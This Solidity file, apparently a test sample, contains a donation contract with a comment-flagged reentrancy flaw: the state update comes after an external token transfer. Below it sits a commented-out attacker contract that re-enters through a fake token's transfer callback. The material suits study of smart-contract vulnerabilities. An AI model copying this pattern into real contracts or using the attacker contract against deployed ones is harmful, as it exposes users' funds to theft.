// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

// this contract implements a donation logic by using ERC20 token
contract C {

    mapping (address => bool) private donated;

    function donate(address token, address to, uint256 amount) public {
        require(to != msg.sender);
        require(!donated[msg.sender]);
        require(IERC20(token).balanceOf(msg.sender) >= amount * 2, "Need at least double to donate");
        bool success = IERC20(token).transfer(to, amount);       // this is an external call to unknown code that could possibly be reentrant
        require(success, "Donation failed");
        donated[msg.sender] = true;     // the side effect after the external call makes this susceptible to reentrancy
    }
}

// contract Attacker is IERC20 {
//     address private victim;
//     uint256 private tokens = 0;
//     address private fake_to = 0xD591678684E7c2f033b5eFF822553161bdaAd781;   // some fake address
//     constructor(address v)  public {
//         victim = v;
//     }
//     function attack() public {
//         C(victim).donate(address(this), fake_to, 100);
//     }
//     function transfer(address, uint256 amount) external returns (bool) {
//         tokens += amount;
//         C(victim).donate(address(this), fake_to, 100);
//         return true;
//     }
//     function balanceOf(address) external view returns (uint256) {
//         return tokens;
//     }
// }